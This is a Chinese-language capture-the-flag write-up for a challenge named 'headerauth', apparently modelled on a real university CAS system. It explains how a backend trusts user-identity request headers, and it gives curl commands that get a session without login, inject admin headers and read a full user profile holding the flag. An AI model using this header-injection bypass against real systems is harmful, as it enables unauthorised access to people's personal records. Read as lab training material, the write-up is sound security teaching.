# headerauth Writeup

## 漏洞点

真实原型（某高校 CAS，2026 年 3 月实测 P0）是一条**信任缝隙**：

- **网关（Nginx）侧**：认为后端会做完整鉴权，只负责转发；
- **后端侧**：从请求头里直接读 `loginUserId` / `loginUserOrgId` 当作用户身份，
  认为网关已经完成了认证——这两个头正常由**前端 axios 拦截器**在登录后注入。

中间没有任何一层真正校验"请求者是谁"。于是一个完全未认证的请求，只要
手动带上这两个头，就以任意身份通过了。

环境里的关键端点（路径出处是题1 的 doc.html 接口表——系列线索递进；
`robots.txt` 的 `Disallow: /sc/api/` 佐证禁区之下有货）：

| 端点 | 说明 |
|---|---|
| `GET /sc/api/application/open/ssoLogin/` | 开放入口，302 并下发 `customsid` 会话 Cookie |
| `GET /sc/api/authc/users` | 需要 `customsid`；身份只看请求头；管理员 = `loginUserId: 1` + `loginUserOrgId: -1` |
| `GET /sc/api/authc/users/{userId}` | 全量档案，仅管理员 |

前端拦截器证据（app.js，与真实平台同款）：

```js
e.headers.get.loginUserId = t.userId
e.headers.get.loginUserOrgId = t.orgId
```

## 利用思路

```bash
# 1. 无认证拿会话
curl -i -c cj.txt "http://HOST:58000/sc/api/application/open/ssoLogin/"
#    -> 302 + Set-Cookie: customsid=...

# 2. 注入管理员身份头，按名检索（也可以翻页）
curl -b cj.txt -H "loginUserId: 1" -H "loginUserOrgId: -1" \
     "http://HOST:58000/sc/api/authc/users?name=Neeco"
#    -> records[0].userId = 20258888（摘要只有 10 个字段，没有 flag）

# 3. 取全量档案
curl -b cj.txt -H "loginUserId: 1" -H "loginUserOrgId: -1" \
     "http://HOST:58000/sc/api/authc/users/20258888" | jq -r .data.description
#    -> hctf{...}
```

## exp

```bash
python3 exp.py http://HOST:58000
```

## 本实例（独立部署版）的漏洞面

赛题链"2026-05 两轮整改后"版本：题1 的路径穿越已封堵（`/sc/..;/doc.html` 一律
404，doc.html 在本实例不可达）；题2 的前端私钥漏洞已整改——app.js 中的
`private_exponent` 已轮换为无效值（见 `verify_key_rotation.py`：旧密文用轮换后的
d 解密必然 padding 校验失败）。仅保留本题的请求头信任漏洞，flag 在 Neeco 档案中。
